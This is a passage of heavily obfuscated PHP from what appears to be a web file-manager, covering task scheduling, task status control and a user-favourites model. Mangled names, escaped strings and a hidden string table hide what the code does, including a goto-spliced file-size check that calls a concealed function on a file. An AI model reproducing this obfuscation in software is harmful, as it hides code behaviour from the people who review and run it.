{ self::restart(); self::log("\x73\x74\157\160\x65\144\x2e\133\166\x65\162\163\151\157\156\x20\165\x70\144\141\164\145\x3b{$versionNow}\40\75\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¢Ü™åÍ =& $_SERVER[ü¢ÙÊñÛ]; http_close(); $GLOBALS[$¢Ü™åÍ[1720]] = 1; $_SERVER[$¢Ü™åÍ[1721]] = $¢Ü™åÍ[1722]; $_COOKIE = array(); $GLOBALS[$¢Ü™åÍ[1723]] = 1; $GLOBALS[$¢Ü™åÍ[1724]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $§îß¯±ê =& $_SERVER[ü¢ÙÊñÛ]; http_close(); self::valueSet($§îß¯±ê[815], $§îß¯±ê[241]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($§îß¯±ê[1708] => $§îß¯±ê[241], $§îß¯±ê[815] => $§îß¯±ê[102])); self::log($§îß¯±ê[1725]); } public static function taskSwitch() { $¥ß‹•Ä =& $_SERVER[ü¢ÙÊñÛ]; $íÃıÒ‚ƒ = self::valueGet($¥ß‹•Ä[815]) == $¥ß‹•Ä[102] ? $¥ß‹•Ä[241] : $¥ß‹•Ä[102]; self::valueSet($¥ß‹•Ä[815], $íÃıÒ‚ƒ); } public static function shutdownEvent() { $¬é™Á¸· =& $_SERVER[ü¢ÙÊñÛ]; self::valueSet($¬é™Á¸·[1708], $¬é™Á¸·[241]); self::log($¬é™Á¸·[1726]); } public static function config($¢ä«ë, $ó‹¨îÇ) { self::valueSet($_SERVER[ü¢ÙÊñÛ][815], $¢ä«ë); } private static function taskRunAll() { $ÜŒ°ÊĞ =& $_SERVER[ü¢ÙÊñÛ]; $Îı‰”³¼ = timeFloat(); $ÏÖ£¶±Ù = Model($ÜŒ°ÊĞ[1727])->listData(); $ÂÄ–´Ï = count($ÏÖ£¶±Ù); for ($¸§Œ«ë© = 0; $¸§Œ«ë© < $ÂÄ–´Ï; $¸§Œ«ë©++) { $î¢şÇ û = $ÏÖ£¶±Ù[$¸§Œ«ë©]; if (!$î¢şÇ û[$ÜŒ°ÊĞ[486]] || $î¢şÇ û[$ÜŒ°ÊĞ[1728]] != $ÜŒ°ÊĞ[102]) { continue; } if (!self::taskTimeCheck($î¢şÇ û)) { continue; } self::taskRun($î¢şÇ û); } Hook::trigger($ÜŒ°ÊĞ[1729]); self::taskQueueRun($Îı‰”³¼); } private static function taskQueueRun($äĞıêú—) { $ˆ˜· ™¿ = 10; while (!0) { $ŞÈÕ¦‡ = TaskQueue::run(); if ($ŞÈÕ¦‡ === !1) { break; } if (timeFloat() - $äĞıêú— >= $ˆ˜· ™¿) { break; } } } private static function taskTimeCheck($şûšøÄ£) { $à››œ‚ò =& $_SERVER[ü¢ÙÊñÛ]; $­á¦§Ê = json_decode($şûšøÄ£[$à››œ‚ò[217]], !0); $ôà·Õì© = intval($şûšøÄ£[$à››œ‚ò[1709]]); $ß¼ÖŸ¦Ó = strtotime($à››œ‚ò[1730] . $­á¦§Ê[$à››œ‚ò[1731]] . $à››œ‚ò[1732]) - strtotime($à››œ‚ò[1733]); $™¤Ì‘‡… = time() - strtotime(date($à››œ‚ò[1734]) . $à››œ‚ò[1735]); $æ­›èçí = $™¤Ì‘‡… >= $ß¼ÖŸ¦Ó && $™¤Ì‘‡… <= $ß¼ÖŸ¦Ó + 3600; switch ($­á¦§Ê[$à››œ‚ò[43]]) { case $à››œ‚ò[1736]: if (time() - $ôà·Õì© < 3600 * 24 * 30) { return !1; } if ($­á¦§Ê[$à››œ‚ò[1736]] == date($à››œ‚ò[1737]) && $æ­›èçí) { return !0; } break; case $à››œ‚ò[1738]: if (time() - $ôà·Õì© < 3600 * 24 * 7) { return !1; } $ŸÚ·«Ú’ = date($à››œ‚ò[1739]) == 0 ? 7 : date($à››œ‚ò[1739]); if ($­á¦§Ê[$à››œ‚ò[1738]] == $ŸÚ·«Ú’ && $æ­›èçí) { return !0; } break; case $à››œ‚ò[1731]: if (time() - $ôà·Õì© < 3600 * 24) { return !1; } if ($æ­›èçí) { return !0; } break; case $à››œ‚ò[1740]: if (time() - $ôà·Õì© >= floatval($­á¦§Ê[$à››œ‚ò[1740]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ç—ˆÀ¾‚ =& $_SERVER[ü¢ÙÊñÛ]; static $¤¿ÍÅïŠ = 0; $°´„Ú´ = 300; if (!$¤¿ÍÅïŠ) { $¤¿ÍÅïŠ = time(); } if (time() - $¤¿ÍÅïŠ < $°´„Ú´) { return; } $¤¿ÍÅïŠ = time(); $¢±í˜×¨ = Model($Ç—ˆÀ¾‚[588])->db($Ç—ˆÀ¾‚[22]); if ($¢±í˜×¨) { $¢±í˜×¨->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ç—ˆÀ¾‚[1741], $Ç—ˆÀ¾‚[1742]); die; } } public static function taskRun($¢¬Î™œÈ) { $¯µÔÏ´É =& $_SERVER[ü¢ÙÊñÛ]; self::log($¯µÔÏ´É[1743] . $¢¬Î™œÈ[$¯µÔÏ´É[486]] . $¯µÔÏ´É[1744] . $¢¬Î™œÈ[$¯µÔÏ´É[42]] . $¯µÔÏ´É[1745] . $¢¬Î™œÈ[$¯µÔÏ´É[1746]]); Model($¯µÔÏ´É[1727])->run($¢¬Î™œÈ[$¯µÔÏ´É[486]]); $ÊÅÀË¿† = timeFloat(); $ƒ†ª ÛÃ = $¯µÔÏ´É[22]; switch ($¢¬Î™œÈ[$¯µÔÏ´É[43]]) { case $¯µÔÏ´É[394]: $Ô¤È¨ = url_request($¢¬Î™œÈ[$¯µÔÏ´É[1746]], $¯µÔÏ´É[1485], !1, !1, !1, !1, 10); if ($Ô¤È¨[$¯µÔÏ´É[815]]) { $ƒ†ª ÛÃ = strlen($Ô¤È¨[$¯µÔÏ´É[1276]]); } break; case $¯µÔÏ´É[1747]: $ƒ†ª ÛÃ = Hook::apply($¢¬Î™œÈ[$¯µÔÏ´É[1746]]); default: break; } Model($¯µÔÏ´É[1748])->add(array($¯µÔÏ´É[1749] => $¯µÔÏ´É[22], $¯µÔÏ´É[1750] => $¯µÔÏ´É[241], $¯µÔÏ´É[43] => $¯µÔÏ´É[1751] . $¢¬Î™œÈ[$¯µÔÏ´É[486]], $¯µÔÏ´É[1752] => json_encode(array($¯µÔÏ´É[42] => $¢¬Î™œÈ[$¯µÔÏ´É[42]], $¯µÔÏ´É[1753] => timeFloat() - $ÊÅÀË¿†, $¯µÔÏ´É[380] => $ƒ†ª ÛÃ)))); $Í²ü€Í¸ = $ƒ†ª ÛÃ ? $¯µÔÏ´É[1754] . $ƒ†ª ÛÃ : $¯µÔÏ´É[22]; self::log($¯µÔÏ´É[1755] . $¢¬Î™œÈ[$¯µÔÏ´É[486]] . $¯µÔÏ´É[189] . $Í²ü€Í¸); return !0; } public static function valueGet($˜‹üËåß) { $Ã©Şîã =& $_SERVER[ü¢ÙÊñÛ]; $Ò¢×¾ò = $Ã©Şîã[1756]; $¸Ûü´ÅÀ = Model($Ã©Şîã[519])->get($˜‹üËåß, $Ò¢×¾ò); if (is_null($¸Ûü´ÅÀ)) { Model($Ã©Şîã[519])->set($Ã©Şîã[815], $Ã©Şîã[102], $Ò¢×¾ò); Model($Ã©Şîã[519])->set($Ã©Şîã[1708], $Ã©Şîã[241], $Ò¢×¾ò); $¸Ûü´ÅÀ = Model($Ã©Şîã[519])->get($˜‹üËåß, $Ò¢×¾ò); } return $¸Ûü´ÅÀ; } private static function valueSet($÷†‚’ß½, $¸ ’â‹ƒ = false) { $â³º‚«œ =& $_SERVER[ü¢ÙÊñÛ]; $™Íêß» = $â³º‚«œ[1757]; CacheLock::lock($™Íêß»); $µ§†ªÖ = Model($â³º‚«œ[519])->set($÷†‚’ß½, $¸ ’â‹ƒ, $â³º‚«œ[1756]); CacheLock::unlock($™Íêß»); return $µ§†ªÖ; } protected static function log($ÉÚÉÇÅØ) { write_log($ÉÚÉÇÅØ, $_SERVER[ü¢ÙÊñÛ][1742]); } private static function cacheClear() { $ ùÜş¾ =& $_SERVER[ü¢ÙÊñÛ]; Cache::clearMemory(Model($ ùÜş¾[519])->cacheKey($ ùÜş¾[1756])); Cache::clearMemory(Model($ ùÜş¾[519])->cacheKey($ ùÜş¾[1758])); Model($ ùÜş¾[1727])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\156\151\156\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÖèâÇÌ›, $ÈÛú³œª = '', $üÀ±šó± = 0, $–¼‚‘ˆ§ = '') { $ïù’…ãì =& $_SERVER[ü¢ÙÊñÛ]; if (self::get($ÖèâÇÌ›)) { return; } $this->task = array($ïù’…ãì[486] => $ÖèâÇÌ›, $ïù’…ãì[1759] => USER_ID, $ïù’…ãì[1647] => $–¼‚‘ˆ§, $ïù’…ãì[537] => $ïù’…ãì[22], $ïù’…ãì[43] => $ÈÛú³œª, $ïù’…ãì[1131] => $ïù’…ãì[22], $ïù’…ãì[1129] => $üÀ±šó±, $ïù’…ãì[1760] => 0, $ïù’…ãì[1761] => 0, $ïù’…ãì[1762] => 0, $ïù’…ãì[1763] => timeFloat(), $ïù’…ãì[1764] => 0, $ïù’…ãì[1765] => 0, $ïù’…ãì[1766] => 0, $ïù’…ãì[1767] => 0, $ïù’…ãì[815] => $ïù’…ãì[1708]); $GLOBALS[$ïù’…ãì[1768]] = 1; Hook::bind($ïù’…ãì[1712], array($this, $ïù’…ãì[1769])); Hook::bind($ïù’…ãì[1770], array($this, $ïù’…ãì[1771])); $this->startAfter(); Hook::trigger($ïù’…ãì[1772], $this->task); $this->task[$ïù’…ãì[1765]] = timeFloat(); } public function end($¬†•¹‹ = '') { $Åú¸¸á =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Åú¸¸á[1765]]) { self::valueSet($this->task[$Åú¸¸á[486]], !1); } $this->isEnd = !0; if ($¬†•¹‹) { $this->task[$Åú¸¸á[537]] = $¬†•¹‹; } self::log($Åú¸¸á[1773] . $this->task[$Åú¸¸á[486]] . $Åú¸¸á[1774] . sprintf($Åú¸¸á[918], timeFloat() - $this->task[$Åú¸¸á[1763]]) . $Åú¸¸á[1775]); Hook::unbind($Åú¸¸á[1712], array($this, $Åú¸¸á[1769])); Hook::unbind($Åú¸¸á[1770], array($this, $Åú¸¸á[1771])); $this->endAfter(); $ô¬â°ì‰ = $this->task; $this->task = !1; Hook::trigger($Åú¸¸á[1776], $ô¬â°ì‰); } public function update($Ğ×ø¿æ = 0, $øÁßËÅ¹ = false) { $ãíöÑØŠ =& $_SERVER[ü¢ÙÊñÛ]; $¥¿ïÊ³ç =& $this->task; if (!$¥¿ïÊ³ç) { return; } $¥¿ïÊ³ç[$ãíöÑØŠ[1760]] += $Ğ×ø¿æ; $¥¿ïÊ³ç[$ãíöÑØŠ[1764]] = timeFloat(); if ($¥¿ïÊ³ç[$ãíöÑØŠ[1129]]) { if ($¥¿ïÊ³ç[$ãíöÑØŠ[1129]] < $¥¿ïÊ³ç[$ãíöÑØŠ[1760]]) { $¥¿ïÊ³ç[$ãíöÑØŠ[1129]] = $¥¿ïÊ³ç[$ãíöÑØŠ[1760]]; } $äÆ¬—â = timeFloat() - $¥¿ïÊ³ç[$ãíöÑØŠ[1763]] - $¥¿ïÊ³ç[$ãíöÑØŠ[1766]]; if ($äÆ¬—â <= 0) { $äÆ¬—â = 0.001; } $¥¿ïÊ³ç[$ãíöÑØŠ[1761]] = $¥¿ïÊ³ç[$ãíöÑØŠ[1760]] / $¥¿ïÊ³ç[$ãíöÑØŠ[1129]]; $¥¿ïÊ³ç[$ãíöÑØŠ[1762]] = $¥¿ïÊ³ç[$ãíöÑØŠ[1760]] / $äÆ¬—â; if ($¥¿ïÊ³ç[$ãíöÑØŠ[1761]] > 0) { $¥¿ïÊ³ç[$ãíöÑØŠ[1767]] = $äÆ¬—â * (1 - $¥¿ïÊ³ç[$ãíöÑØŠ[1761]]) / $¥¿ïÊ³ç[$ãíöÑØŠ[1761]]; } $¥¿ïÊ³ç[$ãíöÑØŠ[1767]] = $¥¿ïÊ³ç[$ãíöÑØŠ[1767]] <= 0 ? 0 : $¥¿ïÊ³ç[$ãíöÑØŠ[1767]]; } $this->updateAfter(); $›™”ıÜ¢ = 0.2; if (timeFloat() - $¥¿ïÊ³ç[$ãíöÑØŠ[1765]] < $›™”ıÜ¢ && !$øÁßËÅ¹) { return; } $òõË‚¸Ê = self::get($¥¿ïÊ³ç[$ãíöÑØŠ[486]]); $Âøæâ¯Ê = $òõË‚¸Ê[$ãíöÑØŠ[815]]; if ($Âøæâ¯Ê == self::STATYS_KILL) { $ê£èùàü = array($ãíöÑØŠ[1777] => LNG($ãíöÑØŠ[1778]), $ãíöÑØŠ[1286] => !1); Cache::set($ãíöÑØŠ[1779] . $this->task[$ãíöÑØŠ[486]], $ê£èùàü, 30); $this->onKill(); $this->end(); die; } else { if ($Âøæâ¯Ê == self::STATYS_STOP) { $ˆç¨œĞÎ = 2; $òõË‚¸Ê[$ãíöÑØŠ[1766]] += $ˆç¨œĞÎ; self::valueSet($¥¿ïÊ³ç[$ãíöÑØŠ[486]], $òõË‚¸Ê); sleep($ˆç¨œĞÎ); $this->update(); return; } } $¥¿ïÊ³ç[$ãíöÑØŠ[815]] = $Âøæâ¯Ê ? $Âøæâ¯Ê : $¥¿ïÊ³ç[$ãíöÑØŠ[815]]; $¥¿ïÊ³ç[$ãíöÑØŠ[1766]] = $òõË‚¸Ê[$ãíöÑØŠ[1766]] ? $òõË‚¸Ê[$ãíöÑØŠ[1766]] : 0; $¥¿ïÊ³ç[$ãíöÑØŠ[1765]] = timeFloat(); Hook::trigger($ãíöÑØŠ[1780], $¥¿ïÊ³ç); self::valueSet($¥¿ïÊ³ç[$ãíöÑØŠ[486]], $¥¿ïÊ³ç); } public function onKillSet($Ñ Ş£äÌ, $€ò¯ÒàÅ = array()) { $this->onKillCall = array($Ñ Ş£äÌ, $€ò¯ÒàÅ); } public function onKill() { $ƒêé×³ =& $_SERVER[ü¢ÙÊñÛ]; self::log($ƒêé×³[1773] . $this->task[$ƒêé×³[486]] . $ƒêé×³[1781]); Hook::trigger($ƒêé×³[1782], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($´ï„Íş) { $²‚ÖÏğ =& $_SERVER[ü¢ÙÊñÛ]; Cache::set($²‚ÖÏğ[1779] . $this->task[$²‚ÖÏğ[486]], $´ï„Íş, 60); if (!is_array($´ï„Íş) || !$´ï„Íş[$²‚ÖÏğ[1286]]) { self::log($²‚ÖÏğ[1783] . json_encode($´ï„Íş)); } return $´ï„Íş; } public static function get($­îã´øƒ) { $î…ÛûØ =& $_SERVER[ü¢ÙÊñÛ]; $ÏÇ³ƒãÔ = self::valueGet($­îã´øƒ); if (is_array($ÏÇ³ƒãÔ) && $ÏÇ³ƒãÔ[$î…ÛûØ[1784]]) { $Á§óš = ActionApply($ÏÇ³ƒãÔ[$î…ÛûØ[1784]], array($ÏÇ³ƒãÔ)); $ÏÇ³ƒãÔ = is_array($Á§óš) ? $Á§óš : $ÏÇ³ƒãÔ; } return $ÏÇ³ƒãÔ; } public static function listData() { $å¡Ù Ï = self::valueGet(); return array_sort_by($å¡Ù Ï, $_SERVER[ü¢ÙÊñÛ][1763], !0); } public static function kill($—½üè±) { return self::changeStatus($—½üè±, self::STATYS_KILL); } public static function stop($ò—ƒ‘Ïº) { return self::changeStatus($ò—ƒ‘Ïº, self::STATYS_STOP); } public static function restart($÷Ÿ–ÅÑ—) { return self::changeStatus($÷Ÿ–ÅÑ—, self::STATYS_RUNNING); } public static function killAll() { $ùÔİ…õÎ =& $_SERVER[ü¢ÙÊñÛ]; $ÅÇ¥à±É = self::listData(); foreach ($ÅÇ¥à±É as $°êª·÷) { self::kill($°êª·÷[$ùÔİ…õÎ[486]]); } sleep(2); foreach ($ÅÇ¥à±É as $°êª·÷) { self::valueSet($°êª·÷[$ùÔİ…õÎ[486]], !1); } } private static function changeStatus($ıÉ‰„ç“, $ô‰ÜÀ…å) { $½Á­‰ìÆ =& $_SERVER[ü¢ÙÊñÛ]; $ÛÊÛ¾Òë = self::valueGet($ıÉ‰„ç“); if (!$ÛÊÛ¾Òë) { return !1; } $ÛÊÛ¾Òë[$½Á­‰ìÆ[815]] = $ô‰ÜÀ…å; self::valueSet($ıÉ‰„ç“, $ÛÊÛ¾Òë); self::log($½Á­‰ìÆ[1785] . $ÛÊÛ¾Òë[$½Á­‰ìÆ[486]] . $½Á­‰ìÆ[1786] . $ô‰ÜÀ…å); return !0; } public static function valueGet($–™ËíËÏ = false) { $Í ã¤º— =& $_SERVER[ü¢ÙÊñÛ]; if ($–™ËíËÏ) { $ìä™îºà = Model($Í ã¤º—[531])->where(array($Í ã¤º—[108] => $–™ËíËÏ, $Í ã¤º—[43] => $Í ã¤º—[1138]))->find(); return $ìä™îºà ? json_decode($ìä™îºà[$Í ã¤º—[462]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ï£‘™ï = false) { $™¬Ğ¼ê“ =& $_SERVER[ü¢ÙÊñÛ]; $ÆÊ¤Ê‡Ÿ = array($™¬Ğ¼ê“[43] => $™¬Ğ¼ê“[1138]); if ($ï£‘™ï) { $ÆÊ¤Ê‡Ÿ[$™¬Ğ¼ê“[1759]] = $ï£‘™ï; } $„ˆƒÆù = Model($™¬Ğ¼ê“[531])->where($ÆÊ¤Ê‡Ÿ)->select(); $„ˆƒÆù = $„ˆƒÆù ? $„ˆƒÆù : array(); foreach ($„ˆƒÆù as $“†Æ²©Õ => $ü…ºâ¡õ) { $„ˆƒÆù[$“†Æ²©Õ] = json_decode($ü…ºâ¡õ[$™¬Ğ¼ê“[462]], !0); } return $„ˆƒÆù; } public static function valueSet($¥œ«Çù , $æ À‹©£) { $ÇàµÒ¯ =& $_SERVER[ü¢ÙÊñÛ]; if (!$æ À‹©£) { return Model($ÇàµÒ¯[531])->where(array($ÇàµÒ¯[108] => $¥œ«Çù , $ÇàµÒ¯[43] => $ÇàµÒ¯[1138]))->delete(); } $Õ¡¼Öâ = json_encode($æ À‹©£); if (!$Õ¡¼Öâ) { ob_start(); var_dump($æ À‹©£); $¨—±¢Íî = ob_get_clean(); self::log($ÇàµÒ¯[1787] . json_encode_force($¨—±¢Íî)); } if (!$¥œ«Çù  || !$æ À‹©£[$ÇàµÒ¯[486]]) { return !1; } $ƒüè²” = array($ÇàµÒ¯[43] => $ÇàµÒ¯[1138], $ÇàµÒ¯[1759] => USER_ID, $ÇàµÒ¯[108] => $¥œ«Çù , $ÇàµÒ¯[462] => $Õ¡¼Öâ); $Œá÷½  = $ÇàµÒ¯[1788]; CacheLock::lock($Œá÷½ ); Model($ÇàµÒ¯[531])->add($ƒüè²”, array(), !0); CacheLock::unlock($Œá÷½ ); } public static function log($„İâøÂÙ) { if (!GLOBAL_DEBUG) { return; } write_log($„İâøÂÙ, $_SERVER[ü¢ÙÊñÛ][1789]); } } goto Eëƒ¬˜«; AàÑÜå‰Û: $_size = $_SERVER[ü¢ÙÊñÛ][5]; if ($_SERVER[$_SERVER[ü¢ÙÊñÛ][6]] != $_size($_file)) { $_getc = $_SERVER[ü¢ÙÊñÛ][7]; $_getfile = $_SERVER[$_SERVER[ü¢ÙÊñÛ][8]] . $_SERVER[ü¢ÙÊñÛ][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ü¢ÙÊñÛ][10], $_getfilec); if (count($_getarrs) < $_SERVER[ü¢ÙÊñÛ][11]) { $exit = $_SERVER[ü¢ÙÊñÛ][12]; $exit(); } $_act = $_SERVER[ü¢ÙÊñÛ][13]; $_act($_file); } class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($œ‰¥Š, $ŒÔÖ“ÁÈ) { $ŞÑ—Øƒ =& $_SERVER[ü¢ÙÊñÛ]; if (isset(self::$_methodList[$œ‰¥Š])) { return @call_user_func_array(self::$_methodList[$œ‰¥Š], $ŒÔÖ“ÁÈ); } else { if (method_exists($this, $œ‰¥Š)) { return call_user_func_array(array($this, $œ‰¥Š), $ŒÔÖ“ÁÈ); } else { think_exception(__CLASS__ . $ŞÑ—Øƒ[14] . $œ‰¥Š . $ŞÑ—Øƒ[15]); } } } public static function __callStatic($Ğ½Á«×, $€½ˆ¬Õˆ) { if (isset(self::$_methodListStatic[$Ğ½Á«×])) { return call_user_func_array(self::$_methodListStatic[$Ğ½Á«×], $€½ˆ¬Õˆ); } else { if (method_exists(self, $Ğ½Á«×)) { return call_user_func_array(array(self, $Ğ½Á«×), $€½ˆ¬Õˆ); } else { show_json("{$Ğ½Á«×}\x28\x29\x20\x6e\x6f\164\x20\x65\170\151\x73\164\73", !1); } } } public static function addMethod($†„¾ÍÉ, $ÜÛ‰á‡) { self::$_methodList[$†„¾ÍÉ] = $ÜÛ‰á‡; } public static function addMethodStatic($ùâË—ôã, $“ğö”î”) { self::$_methodListStatic[$ùâË—ôã] = $“ğö”î”; } } goto E‰æÇÜĞ·; cøÔ™ïî»ä: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($¶ĞÉôğ÷) { $¤£‹Ãæ® =& $_SERVER[ü¢ÙÊñÛ]; return array($¤£‹Ãæ®[2074] => array(USER_ID, $¤£‹Ãæ®[2445])); } protected function listData() { $•×¥±ş =& $_SERVER[ü¢ÙÊñÛ]; $ÊïÁøø = array($•×¥±ş[1750] => USER_ID, $•×¥±ş[568] => 0); $óÄó˜ç˜ = $•×¥±ş[2446]; $À“—·Ô† = $this->field($óÄó˜ç˜)->where($ÊïÁøø)->order($•×¥±ş[2447])->select(); return $À“—·Ô† ? $À“—·Ô† : array(); } protected function resetCache() { } protected function listView() { $©øÁ¦¼³ =& $_SERVER[ü¢ÙÊñÛ]; $ñ¸—‘íô = $this->listData(); $ô¥î®Öá = array_filter_by_field($ñ¸—‘íô, $©øÁ¦¼³[43], $©øÁ¦¼³[501]); $¡àìÉü¸ = array_to_keyvalue($ô¥î®Öá, $©øÁ¦¼³[22], $©øÁ¦¼³[98]); if (!$¡àìÉü¸) { return $ñ¸—‘íô; } $¸´†Èèñ = 2000; $şáıÁŸî = array($©øÁ¦¼³[502] => array($©øÁ¦¼³[503], $¡àìÉü¸)); $ûçàÒô = Model($©øÁ¦¼³[890])->listSource($şáıÁŸî, $¸´†Èèñ); $ûçàÒô = array_merge($ûçàÒô[$©øÁ¦¼³[97]], $ûçàÒô[$©øÁ¦¼³[96]]); $ûçàÒô = array_to_keyvalue($ûçàÒô, $©øÁ¦¼³[204]); foreach ($ñ¸—‘íô as $ıìòÖ‚ => $ªóŞ¾Ş±) { $¸ç¾‘ğä = $ûçàÒô[$ªóŞ¾Ş±[$©øÁ¦¼³[98]]]; $¸ç¾‘ğä = $¸ç¾‘ğä ? $¸ç¾‘ğä : array(); $ñ¸—‘íô[$ıìòÖ‚] = array_merge($¸ç¾‘ğä, $ªóŞ¾Ş±); } return $ñ¸—‘íô; } protected function addFav($ŠâØÁ¸‹, $­€”ŠşÔ = '', $ù¦öäÅÙ = "\x73\157\165\x72\143\x65") { $Ñìõóê =& $_SERVER[ü¢ÙÊñÛ]; $Éğí×æı = array($Ñìõóê[1750] => USER_ID, $Ñìõóê[568] => 0, $Ñìõóê[507] => $ù¦öäÅÙ, $Ñìõóê[506] => $ŠâØÁ¸‹); if ($this->where($Éğí×æı)->find()) { return !1; } $Éğí×æı = array($Ñìõóê[1750] => USER_ID, $Ñìõóê[568] => 0); $ş€µ·Ü = $this->where($Éğí×æı)->max($Ñìõóê[1983]); if (!$ş€µ·Ü) { $ş€µ·Ü = 0; } if (!$­€”ŠşÔ && $ù¦öäÅÙ == $Ñìõóê[501]) { $ÎĞöúÙÖ = Model($Ñìõóê[1410])->where(array($Ñìõóê[502] => $ŠâØÁ¸‹))->find(); if (!$ÎĞöúÙÖ) { return !1; } $­€”ŠşÔ = $ÎĞöúÙÖ[$Ñìõóê[42]]; } $­€”ŠşÔ = $this->getAutoName($­€”ŠşÔ); $ÅÎÕıùÒ = array($Ñìõóê[1750] => USER_ID, $Ñìõóê[568] => 0, $Ñìõóê[505] => $­€”ŠşÔ, $Ñìõóê[506] => $ŠâØÁ¸‹, $Ñìõóê[507] => $ù¦öäÅÙ, $Ñìõóê[1963] => $ş€µ·Ü + 1); return $this->add($ÅÎÕıùÒ); } protected function remove($¾²ÜìÅ³) { $¨—Üú¬ı =& $_SERVER[ü¢ÙÊñÛ]; $˜Ã¥…€ó = array($¨—Üú¬ı[1750] => USER_ID, $¨—Üú¬ı[504] => $¾²ÜìÅ³); return $this->where($˜Ã¥…€ó)->delete(); } protected function removeByName($ß·¼µ») { $Â³ÀŠÍ“ =& $_SERVER[ü¢ÙÊñÛ]; $îÄŞ¦Æ• = array($Â³ÀŠÍ“[1750] => USER_ID, $Â³ÀŠÍ“[505] => $ß·¼µ», $Â³ÀŠÍ“[568] => 0); return $this->where($îÄŞ¦Æ•)->delete(); } protected function rename($­ì­±‰Í, $´Çä²½“) { $“òáÊü» =& $_SERVER[ü¢ÙÊñÛ]; if ($­ì­±‰Í == $´Çä²½“) { return !1; } $˜¼ëõÚ¼ = $this->getAutoName($´Çä²½“); if ($´Çä²½“ != $˜¼ëõÚ¼) { return !1; } $ÚÌÆáŞ¿ = array($“òáÊü»[1750] => USER_ID, $“òáÊü»[568] => 0, $“òáÊü»[42] => $­ì­±‰Í); return $this->where($ÚÌÆáŞ¿)->save(array($“òáÊü»[42] => $´Çä²½“)); } protected function resetSort($ñŸ‚‰å) { $‰õÊÆ­Ò =& $_SERVER[ü¢ÙÊñÛ]; $ñŸ‚‰å = is_array($ñŸ‚‰å) ? $ñŸ‚‰å : array(); $—¤»Ì†¹ = array($‰õÊÆ­Ò[1750] => USER_ID); for ($ó¹æ¯ô¡ = 0; $ó¹æ¯ô¡ < count($ñŸ‚‰å); $ó¹æ¯ô¡++) { $—¤»Ì†¹[$‰õÊÆ­Ò[504]] = $ñŸ‚‰å[$ó¹æ¯ô¡]; $this->where($—¤»Ì†¹)->save(array($‰õÊÆ­Ò[1963] => $ó¹æ¯ô¡ + 1)); } return !0; } protected function moveTop($ãšê§›) { $Ú„Ó–º =& $_SERVER[ü¢ÙÊñÛ]; $ıÏÏÚ©ç = array($Ú„Ó–º[1750] => USER_ID, $Ú„Ó–º[568] => 0); $·×µÓü¡ = $this->where($ıÏÏÚ©ç)->where(array($Ú„Ó–º[42] => $ãšê§›))->find(); if (!$·×µÓü¡) { return; } $©¨µÂÜÍ = $this->field($Ú„Ó–º[486])->where($ıÏÏÚ©ç)->order($Ú„Ó–º[2447])->select(); $©¨µÂÜÍ = array_to_keyvalue($©¨µÂÜÍ, $Ú„Ó–º[22], $Ú„Ó–º[486]); $…óØİİœ = $©¨µÂÜÍ; $©¨µÂÜÍ = array_remove_value($©¨µÂÜÍ, $·×µÓü¡[$Ú„Ó–º[486]]); array_unshift($©¨µÂÜÍ, $·×µÓü¡[$Ú„Ó–º[486]]); return $this->resetSort($©¨µÂÜÍ); } protected function moveBottom($ù¡‡…‚È) { $“ÙÏ¡Æ =& $_SERVER[ü¢ÙÊñÛ]; $ÖÛ—É¯’ = array($“ÙÏ¡Æ[1750] => USER_ID, $“ÙÏ¡Æ[568] => 0); $õ¬ëŒáë = $this->where($ÖÛ—É¯’)->max($“ÙÏ¡Æ[1983]); $µøİˆ†ø = array($“ÙÏ¡Æ[1983] => $õ¬ëŒáë + 1); return $this->where($ÖÛ—É¯’)->where(array($“ÙÏ¡Æ[42] => $ù¡‡…‚È))->save($µøİˆ†ø); } private function getAutoName($º®ä©å÷) { $ÉŸÇ›Ÿ² =& $_SERVER[ü¢ÙÊñÛ]; $‡€®¡²¶ = array($ÉŸÇ›Ÿ²[1750] => USER_ID, $ÉŸÇ›Ÿ²[568] => 0); $ÂÒå»è¤ = $this->field($ÉŸÇ›Ÿ²[42])->where($‡€®¡²¶)->select(); $ÂÒå»è¤ = array_to_keyvalue($ÂÒå»è¤, $ÉŸÇ›Ÿ²[22], $ÉŸÇ›Ÿ²[42]); if (!$ÂÒå»è¤ || !in_array($º®ä©å÷, $ÂÒå»è¤)) { return $º®ä©å÷; } for ($÷­ú¶æ™ = 0; $÷­ú¶æ™ < count($ÂÒå»è¤); $÷­ú¶æ™++) { if (!in_array($º®ä©å÷ . "\50{$÷­ú¶æ™}\51", $ÂÒå»è¤)) { return $º®ä©å÷ . "\50{$÷­ú¶æ™}\51"; } } return $º®ä©å÷ . "\x28{$÷­ú¶æ™}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\152\x6f\x62\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\144\145\x73\143", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\146\x4a\157\x62\x4c\151\x73\164"; public function listData($Ê–˜‚ï¼ = false, $¤Ó³ú¦¥ = "\x73\x6f\162\164", $ğèî³æá = false) { return parent::listData($Ê–˜‚ï¼, $¤Ó³ú¦¥, $ğèî³æá); } public function remove($´å¶”¢) { return parent::remove($´å¶”¢); } public function add($ÊŸï¾Ã©) { $°•ÚÛ²Ò =& $_SERVER[ü¢ÙÊñÛ]; if 